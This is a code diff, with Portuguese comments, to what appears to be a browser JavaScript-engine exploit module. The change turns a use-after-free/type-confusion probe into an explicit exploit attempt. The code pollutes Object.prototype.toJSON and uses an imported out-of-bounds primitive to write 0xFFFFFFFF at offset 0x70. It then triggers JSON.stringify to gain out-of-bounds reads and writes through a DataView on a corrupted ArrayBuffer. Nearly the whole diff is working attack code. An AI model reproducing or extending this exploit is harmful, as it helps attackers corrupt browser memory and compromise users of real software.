@@ -3,226 +3,204 @@ import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs
 import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
-    oob_write_absolute, clearOOBEnvironment
+    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG } from '../config.mjs';
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-const TARGETED_UAF_TC_PARAMS = {
-    victim_ab_size: 64,
+const EXPLOIT_TC_PARAMS = {
+    victim_ab_original_size: 64, // Tamanho com que victim_ab é criado
     corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
+    value_to_write_for_corruption: 0xFFFFFFFF,
     bytes_to_write_for_corruption: 4,
-    ppKeyToPollute: 'toJSON',
+    ppKey: 'toJSON',
+    description: "ExploitTypeConfusion_0x70_FFFF"
 };
 
-export let currentCallCount_for_UAF_TC_test = 0;
-const MAX_toJSON_DEPTH_FOR_ANALYSIS = 10; 
+export let callCount_toJSON_exploit_tc = 0;
+let victim_ab_for_this_context_ref = null; // Para comparar 'this'
 
-// Renomeada para clareza, esta é a versão "inquisitiva" com controle de profundidade
-export function detailed_toJSON_Inquisitive_WithDepthControl() { 
-    currentCallCount_for_UAF_TC_test++;
+// toJSON Modificada para explorar 'this' como ArrayBuffer se a Type Confusion ocorrer
+export function toJSON_ExploitTypeConfusion() {
+    const FNAME_toJSON_local = `toJSON_ExploitTC(Call ${++callCount_toJSON_exploit_tc})`;
+    document.title = `toJSON_ExploitTC Call ${callCount_toJSON_exploit_tc}`;
+
     const currentOperationThis = this;
-    const FNAME_toJSON_local = `detailed_toJSON_Inquisitive(Call ${currentCallCount_for_UAF_TC_test})`;
+    logS3(`[${EXPLOIT_TC_PARAMS.ppKey} Poluído - Exploit TC] ${FNAME_toJSON_local} Chamado!`, "vuln");
+    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
+    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info");
 
-    // Atualizar título do documento para rastrear chamadas
-    if (currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) {
-         // Log de título menos frequente para não sobrecarregar
-        if (currentCallCount_for_UAF_TC_test === 1 || currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS || currentCallCount_for_UAF_TC_test % 5 === 0) {
-            document.title = `toJSON_Inquisitive Call ${currentCallCount_for_UAF_TC_test}/${MAX_toJSON_DEPTH_FOR_ANALYSIS}`;
-        }
-        logS3(`[toJSON Poluído - Inquisitivo] ${FNAME_toJSON_local} Chamado!`, "vuln");
-        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
-    }
-
-    if (currentCallCount_for_UAF_TC_test > MAX_toJSON_DEPTH_FOR_ANALYSIS) {
-        if (currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS + 1) {
-            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) atingida. Retornando undefined.`, "info");
-            document.title = `toJSON Profundidade Máx (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) Atingida`;
-        }
-        return undefined; 
-    }
-
-    let details = { 
-        raw_byteLength: "N/A", 
-        type_of_raw_byteLength: "N/A",
-        assigned_byteLength: "N/A", 
-        first_dword_attempt: "N/A", 
-        first_dword_value: "N/A",
-        slice_exists: "N/A", 
-        slice_call_attempt: "N/A",
-        slice_call_result: "N/A",
-        type_toString: "N/A" 
+    let tc_details = {
+        this_is_victim_ab: "Não verificado",
+        observed_byteLength: "N/A",
+        dataview_created: false,
+        oob_read_attempt_offset: EXPLOIT_TC_PARAMS.victim_ab_original_size + 16, // Tentar ler 16 bytes além do original
+        oob_read_value: "N/A",
+        oob_write_attempt_offset: EXPLOIT_TC_PARAMS.victim_ab_original_size + 32, // Tentar escrever 32 bytes além
+        oob_write_success: false
     };
-    let error_accessing_props = null;
+
     try {
-        details.type_toString = Object.prototype.toString.call(currentOperationThis);
-        
-        details.raw_byteLength = currentOperationThis.byteLength;
-        details.type_of_raw_byteLength = typeof details.raw_byteLength;
-        details.assigned_byteLength = details.raw_byteLength; 
-        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ACCESSO DIRETO this.byteLength: ${details.raw_byteLength} (tipo: ${details.type_of_raw_byteLength})`, "info");
+        // Verifica se 'this' é o nosso victim_ab de referência
+        if (victim_ab_for_this_context_ref && currentOperationThis === victim_ab_for_this_context_ref) {
+            tc_details.this_is_victim_ab = "SIM (currentOperationThis === victim_ab_for_this_context_ref)";
+            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] CONFIRMADO: 'this' é victim_ab_for_this_context_ref! Tentando explorar...`, "critical");
+        } else if (currentOperationThis instanceof ArrayBuffer) {
+            tc_details.this_is_victim_ab = `POTENCIAL (this instanceof ArrayBuffer, byteLength: ${currentOperationThis.byteLength})`;
+            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] 'this' é um ArrayBuffer. Tentando explorar...`, "vuln");
+        } else {
+            tc_details.this_is_victim_ab = "NÃO (não é ArrayBuffer ou não é a referência esperada)";
+            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] 'this' não é o ArrayBuffer vítima esperado. Tipo: ${typeof currentOperationThis}`, "warn");
+            return { toJSON_TC_exploit_this_mismatch: true, call: callCount_toJSON_exploit_tc, details: tc_details };
+        }
 
-        details.first_dword_attempt = "Tentado";
-        try {
-            if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >=4) {
-                let buffer_to_inspect = currentOperationThis instanceof ArrayBuffer ? currentOperationThis : currentOperationThis.buffer;
-                let offset_to_inspect = currentOperationThis instanceof ArrayBuffer ? 0 : (currentOperationThis.byteOffset || 0);
+        tc_details.observed_byteLength = currentOperationThis.byteLength;
+        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] this.byteLength (do 'this' confuso): ${tc_details.observed_byteLength}`, "leak");
 
-                if (buffer_to_inspect instanceof ArrayBuffer && buffer_to_inspect.byteLength >= offset_to_inspect + 4) {
-                    details.first_dword_value = new DataView(buffer_to_inspect, offset_to_inspect, 4).getUint32(0, true);
-                    details.first_dword_attempt += ", DataView OK";
+        if (typeof tc_details.observed_byteLength === 'number') {
+            if (tc_details.observed_byteLength > EXPLOIT_TC_PARAMS.victim_ab_original_size) {
+                logS3(`  [CALL ${callCount_toJSON_exploit_tc}] !!! SUCESSO UAF/TC PARCIAL !!! this.byteLength (${tc_details.observed_byteLength}) > original (${EXPLOIT_TC_PARAMS.victim_ab_original_size})`, "critical");
+                document.title = `TC Exploit: byteLength=${tc_details.observed_byteLength}`;
+            }
+
+            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] Tentando criar DataView sobre 'this' (tamanho ${tc_details.observed_byteLength})...`, "info");
+            try {
+                let confused_dv = new DataView(currentOperationThis); // Usa o 'this' (ArrayBuffer confuso) diretamente
+                tc_details.dataview_created = true;
+                logS3(`  [CALL ${callCount_toJSON_exploit_tc}] DataView criada sobre 'this' com tamanho ${confused_dv.byteLength}.`, "good");
+
+                // Tentar leitura OOB (relativo ao victim_ab, se o tamanho foi corrompido para maior)
+                if (confused_dv.byteLength > tc_details.oob_read_attempt_offset + 3) {
+                    tc_details.oob_read_value = confused_dv.getUint32(tc_details.oob_read_attempt_offset, true);
+                    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] LEITURA OOB de 'this' @ ${toHex(tc_details.oob_read_attempt_offset)}: ${toHex(tc_details.oob_read_value)}`, "leak");
+                    document.title = `TC Exploit: OOB Read OK @${toHex(tc_details.oob_read_attempt_offset)}=${toHex(tc_details.oob_read_value)}`;
                 } else {
-                    details.first_dword_attempt += ", Buffer inválido ou pequeno demais";
+                    logS3(`  [CALL ${callCount_toJSON_exploit_tc}] Tamanho da DataView confusa (${confused_dv.byteLength}) não permite leitura em ${toHex(tc_details.oob_read_attempt_offset)}.`, "info");
                 }
-            } else {
-                 details.first_dword_attempt += ", 'this' não tem byteLength numérico >= 4 ou não é buffer";
-            }
-        } catch (e_dv) {
-            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao tentar DataView em 'this': ${e_dv.message}`, "warn");
-            details.first_dword_attempt += `, ERRO DataView: ${e_dv.message}`;
-            error_accessing_props = error_accessing_props || `DVAttempt Error: ${e_dv.message}`; 
-        }
 
-        details.slice_exists = (typeof currentOperationThis.slice === 'function');
-        details.slice_call_attempt = "Tentado";
-        try {
-            if (details.slice_exists) { 
-                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] 'this.slice' existe. Tentando chamar this.slice(0,1)...`, "info");
-                let slice_result = currentOperationThis.slice(0,1); 
-                details.slice_call_result = `OK, resultado.byteLength = ${slice_result?.byteLength}, tipo resultado: ${typeof slice_result}`;
-                logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] this.slice(0,1) OK. Result type: ${typeof slice_result}, byteLength: ${slice_result?.byteLength}`, "info");
-            } else {
-                 details.slice_call_attempt += ", 'slice' não é função";
+                // Tentar escrita OOB
+                if (confused_dv.byteLength > tc_details.oob_write_attempt_offset + 3) {
+                    const test_write_val = 0xCAFEBABE;
+                    confused_dv.setUint32(tc_details.oob_write_attempt_offset, test_write_val, true);
+                    let readback = confused_dv.getUint32(tc_details.oob_write_attempt_offset, true);
+                    if (readback === test_write_val) {
+                        tc_details.oob_write_success = true;
+                        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] ESCRITA OOB em 'this' @ ${toHex(tc_details.oob_write_attempt_offset)} VERIFICADA!`, "critical");
+                        document.title = "TC Exploit: OOB WRITE SUCCESS!";
+                    } else {
+                        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] Falha na verificação da escrita OOB em 'this' @ ${toHex(tc_details.oob_write_attempt_offset)}. Leu ${toHex(readback)}`, "error");
+                    }
+                }
+            } catch (e_dv_confused) {
+                logS3(`  [CALL ${callCount_toJSON_exploit_tc}] ERRO ao criar/usar DataView em 'this': ${e_dv_confused.message}`, "error");
+                tc_details.dataview_created = `Erro DV: ${e_dv_confused.message}`;
+                document.title = "TC Exploit: ERRO DataView em 'this'";
             }
-        } catch (e_slice) {
-            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao chamar this.slice(0,1): ${e_slice.message}`, "error");
-            details.slice_call_result = `ERRO: ${e_slice.message}`;
-            error_accessing_props = error_accessing_props || `SliceAttempt Error: ${e_slice.message}`; 
+        } else {
+            logS3(`  [CALL ${callCount_toJSON_exploit_tc}] this.byteLength não é numérico. Não tentando DataView.`, "warn");
         }
-        
-        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Log Final Detalhes: type='${details.type_toString}', assigned_byteLength=${details.assigned_byteLength} (raw_type: ${details.type_of_raw_byteLength}), 1stDwordVal=${(details.first_dword_value === "N/A" || typeof details.first_dword_value === 'string') ? details.first_dword_value : toHex(details.first_dword_value)} (Attempt: ${details.first_dword_attempt}), slice_exists=${details.slice_exists} (Attempt: ${details.slice_call_attempt}, Result: ${details.slice_call_result})`, "info");
-        
-    } catch (e_general) { 
-        error_accessing_props = e_general.message;
-        logS3(`  [toJSON Poluído - Inquisitivo] ${FNAME_toJSON_local} ERRO GERAL ao acessar props: ${e_general.message} (Chamada: ${currentCallCount_for_UAF_TC_test})`, "critical");
-        document.title = `ERRO GERAL toJSON Call ${currentCallCount_for_UAF_TC_test}`;
+        // Retornar algo simples para evitar recursão excessiva se a exploração não for imediata
+        return { toJSON_TC_exploit_attempted: true, call: callCount_toJSON_exploit_tc, details: tc_details };
+    } catch (e_main_toJSON) {
+        logS3(`  [CALL ${callCount_toJSON_exploit_tc}] ERRO GERAL em toJSON_ExploitTypeConfusion: ${e_main_toJSON.message}`, "critical");
+        document.title = `ERRO GERAL toJSON Call ${callCount_toJSON_exploit_tc}`;
+        // Lançar para ser pego pelo catch em torno do JSON.stringify
+        throw new Error(`Erro Geral em toJSON_ExploitTypeConfusion Call ${callCount_toJSON_exploit_tc}: ${e_main_toJSON.message}`);
     }
-    
-    if (error_accessing_props) {
-        // Lançar erro para ser pego pelo try...catch em torno do JSON.stringify
-        throw new Error(`Prop Access Error in toJSON Call ${currentCallCount_for_UAF_TC_test}: ${error_accessing_props}`);
-    }
-    return { toJSON_executed_inquisitive_val_test: true, call: currentCallCount_for_UAF_TC_test, details: details };
 }
 
-export async function executeUAFTypeConfusionTestWithValue(
-    testVariantDescription,
-    valueToWriteOOB
-) {
-    const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
-    const {
-        victim_ab_size,
-        corruption_offset, 
-        bytes_to_write_for_corruption,
-        ppKeyToPollute,
-    } = TARGETED_UAF_TC_PARAMS;
+export async function executeTypeConfusionExploitAttempt() {
+    const FNAME_TEST_RUNNER = EXPLOIT_TC_PARAMS.description;
+    logS3(`--- Iniciando ${FNAME_TEST_RUNNER} ---`, "test", FNAME_TEST_RUNNER);
+    document.title = `Iniciando ${FNAME_TEST_RUNNER}`;
 
-    logS3(`--- Iniciando Teste UAF/TC (Valor Variado c/ toJSON Inquisitiva): ${testVariantDescription} ---`, "test", FNAME_TEST);
-    logS3(`   MAX_toJSON_DEPTH_FOR_ANALYSIS = ${MAX_toJSON_DEPTH_FOR_ANALYSIS}`, "info", FNAME_TEST);
-    logS3(`   Offset: ${toHex(corruption_offset)}, Valor OOB: ${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
-    document.title = `Iniciando UAF/TC InquisV: ${testVariantDescription}`;
-
-    currentCallCount_for_UAF_TC_test = 0; 
-
-    let stringifyResult = null; 
-    let errorOccurredInStringify = null; 
-    let potentiallyFroze = true; 
-    let stepReached = "inicio";
+    callCount_toJSON_exploit_tc = 0;
+    victim_ab_for_this_context_ref = null; // Resetar referência
 
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
-        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
-        return { potentiallyFroze: false, errorOccurred: new Error("OOB Setup Failed"), calls: currentCallCount_for_UAF_TC_test, stringifyResult };
+        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST_RUNNER);
+        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
     }
-    document.title = "OOB Configurado";
-    stepReached = "oob_configurado";
+    document.title = `OOB OK - ${FNAME_TEST_RUNNER}`;
 
-    let victim_ab = new ArrayBuffer(victim_ab_size);
-    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);
-    stepReached = "vitima_criada";
+    victim_ab_for_this_context_ref = new ArrayBuffer(EXPLOIT_TC_PARAMS.victim_ab_original_size);
+    logS3(`victim_ab_for_this_context_ref (${EXPLOIT_TC_PARAMS.victim_ab_original_size}b) criado.`, "info", FNAME_TEST_RUNNER);
 
-    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
-    let pollutionAppliedThisRun = true; 
-    
+    let object_to_stringify = { simple_prop: "trigger_TypeConfusion_toJSON" };
+    logS3(`object_to_stringify criado: ${JSON.stringify(object_to_stringify)}`, "info", FNAME_TEST_RUNNER);
+
+    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, EXPLOIT_TC_PARAMS.ppKey);
+    let pollutionApplied = false;
+    let stepReached = "antes_pp";
+    let potentiallyCrashed = true;
+    let errorCaptured = null;
+    let stringifyResult = null;
+
     try {
-        logS3(`Aplicando PP com detailed_toJSON_Inquisitive_WithDepthControl...`, "info", FNAME_TEST);
         stepReached = "aplicando_pp";
-        document.title = `Aplicando PP InquisV: ${testVariantDescription}`;
-        Object.defineProperty(Object.prototype, ppKeyToPollute, {
-            value: detailed_toJSON_Inquisitive_WithDepthControl, 
+        logS3(`Poluindo Object.prototype.${EXPLOIT_TC_PARAMS.ppKey} com toJSON_ExploitTypeConfusion...`, "info", FNAME_TEST_RUNNER);
+        document.title = `Aplicando PP Exploit TC - ${FNAME_TEST_RUNNER}`;
+        Object.defineProperty(Object.prototype, EXPLOIT_TC_PARAMS.ppKey, {
+            value: toJSON_ExploitTypeConfusion,
             writable: true, configurable: true, enumerable: false
         });
-        logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
+        pollutionApplied = true;
+        logS3(`PP aplicada com toJSON_ExploitTypeConfusion.`, "good", FNAME_TEST_RUNNER);
         stepReached = "pp_aplicada";
-        document.title = `PP Aplicada InquisV: ${testVariantDescription}`;
+        document.title = `PP Exploit TC OK - ${FNAME_TEST_RUNNER}`;
 
-        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(valueToWriteOOB)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
         stepReached = "antes_escrita_oob";
-        document.title = `Antes Escrita OOB InquisV: ${testVariantDescription}`;
-        oob_write_absolute(corruption_offset, valueToWriteOOB, bytes_to_write_for_corruption);
-        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
+        logS3(`CORRUPÇÃO: ${toHex(EXPLOIT_TC_PARAMS.value_to_write_for_corruption)} @ ${toHex(EXPLOIT_TC_PARAMS.corruption_offset)}`, "warn", FNAME_TEST_RUNNER);
+        document.title = `Antes OOB Write Exploit TC - ${FNAME_TEST_RUNNER}`;
+        oob_write_absolute(EXPLOIT_TC_PARAMS.corruption_offset, EXPLOIT_TC_PARAMS.value_to_write_for_corruption, EXPLOIT_TC_PARAMS.bytes_to_write_for_corruption);
+        logS3("Escrita OOB feita.", "info", FNAME_TEST_RUNNER);
         stepReached = "apos_escrita_oob";
-        document.title = `Após Escrita OOB InquisV: ${testVariantDescription}`;
-        
-        await PAUSE_S3(SHORT_PAUSE_S3); 
+        document.title = `Após OOB Write Exploit TC - ${FNAME_TEST_RUNNER}`;
 
-        stepReached = "antes_stringify";
-        document.title = `Antes Stringify InquisV: ${testVariantDescription}`;
-        logS3(`Chamando JSON.stringify(victim_ab)... (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS})`, "info", FNAME_TEST);
+        await PAUSE_S3(SHORT_PAUSE_S3);
+
+        stepReached = "antes_stringify_obj_simples";
+        document.title = `Antes Strfy Obj Simples - ${FNAME_TEST_RUNNER}`;
+        logS3(`Chamando JSON.stringify(object_to_stringify) (esperando que 'this' na toJSON seja victim_ab_for_this_context_ref)...`, "info", FNAME_TEST_RUNNER);
         
         try {
-            stringifyResult = JSON.stringify(victim_ab); 
-            stepReached = "apos_stringify";
-            document.title = `Stringify Retornou InquisV: ${testVariantDescription}`;
-            potentiallyFroze = false; 
-            logS3(`Resultado JSON.stringify: ${String(stringifyResult).substring(0, 200)}...`, "info", FNAME_TEST);
+            stringifyResult = JSON.stringify(object_to_stringify);
+            stepReached = `apos_stringify_obj_simples`;
+            potentiallyCrashed = false;
+            document.title = `Strfy Obj Simples OK - ${FNAME_TEST_RUNNER}`;
+            logS3(`Resultado JSON.stringify(object_to_stringify): ${String(stringifyResult).substring(0, 300)}... (Chamadas toJSON: ${callCount_toJSON_exploit_tc})`, "info", FNAME_TEST_RUNNER);
         } catch (e) {
-            stepReached = "erro_stringify";
-            document.title = `ERRO Stringify (${e.name}) InquisV: ${testVariantDescription}`;
-            potentiallyFroze = false; 
-            errorOccurredInStringify = e; 
-            logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}. (Chamadas toJSON: ${currentCallCount_for_UAF_TC_test})`, "critical", FNAME_TEST);
-            if (e.stack) logS3(e.stack, "error", FNAME_TEST);
-            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
+            stepReached = `erro_stringify_obj_simples`;
+            potentiallyCrashed = false;
+            errorCaptured = e;
+            document.title = `ERRO Strfy Obj Simples (${e.name}) - ${FNAME_TEST_RUNNER}`;
+            logS3(`ERRO CAPTURADO JSON.stringify(object_to_stringify): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_toJSON_exploit_tc})`, "critical", FNAME_TEST_RUNNER);
+            console.error(`JSON.stringify ERROR for object_to_stringify (Exploit TC):`, e);
         }
-
     } catch (mainError) {
-        stepReached = "erro_principal";
-        document.title = `ERRO Principal InquisV: ${testVariantDescription}`;
-        potentiallyFroze = false;
-        errorOccurredInStringify = mainError; 
-        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
-        if (mainError.stack) logS3(mainError.stack, "error", FNAME_TEST);
-        console.error(mainError);
+        potentiallyCrashed = false;
+        errorCaptured = mainError;
+        logS3(`Erro principal: ${mainError.message}`, "error", FNAME_TEST_RUNNER);
+        document.title = "ERRO Principal Exploit TC - " + FNAME_TEST_RUNNER;
+        console.error("Main TC exploit test error:", mainError);
     } finally {
-        if (pollutionAppliedThisRun) { 
-            if (originalToJSONDescriptor) {
-                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
-            } else {
-                delete Object.prototype[ppKeyToPollute];
-            }
+        if (pollutionApplied) {
+            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, EXPLOIT_TC_PARAMS.ppKey, originalToJSONDescriptor);
+            else delete Object.prototype[EXPLOIT_TC_PARAMS.ppKey];
         }
+        victim_ab_for_this_context_ref = null; // Limpar referência
         clearOOBEnvironment();
-        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}.`, "info", FNAME_TEST);
-        if (potentiallyFroze) {
-            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}`, "warn", FNAME_TEST);
-            document.title = `CONGELOU? Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS} Passo: ${stepReached} - Chamadas: ${currentCallCount_for_UAF_TC_test} - ${testVariantDescription}`;
+        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME_TEST_RUNNER);
+        if (potentiallyCrashed) {
+             document.title = `CONGELOU? ${stepReached} - ${FNAME_TEST_RUNNER}`;
+             logS3(`O TESTE PODE TER CONGELADO/CRASHADO em ${stepReached}. Chamadas toJSON: ${callCount_toJSON_exploit_tc}`, "error", FNAME_TEST_RUNNER);
         }
     }
-    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS}, Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}) ---`, "test", FNAME_TEST);
-    if (!potentiallyFroze && !errorOccurredInStringify) {
-        document.title = `Teste UAF/TC InquisV OK: ${testVariantDescription}`;
-    } else if (errorOccurredInStringify) {
-        // Título já reflete o erro
+    logS3(`--- Tentativa de Exploração de Type Confusion Concluída: ${FNAME_TEST_RUNNER} (Chamadas toJSON: ${callCount_toJSON_exploit_tc}) ---`, "test", FNAME_TEST_RUNNER);
+    if (!potentiallyCrashed && !errorCaptured) {
+        document.title = `Teste Exploit TC OK - ${FNAME_TEST_RUNNER}`;
+    } else if (errorCaptured) {
+        // Título já reflete erro
     }
-    return { potentiallyFroze, errorOccurred: errorOccurredInStringify, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
+    return { potentiallyFroze: potentiallyCrashed, errorOccurred: errorCaptured, calls: callCount_toJSON_exploit_tc, stringifyResult };
 }
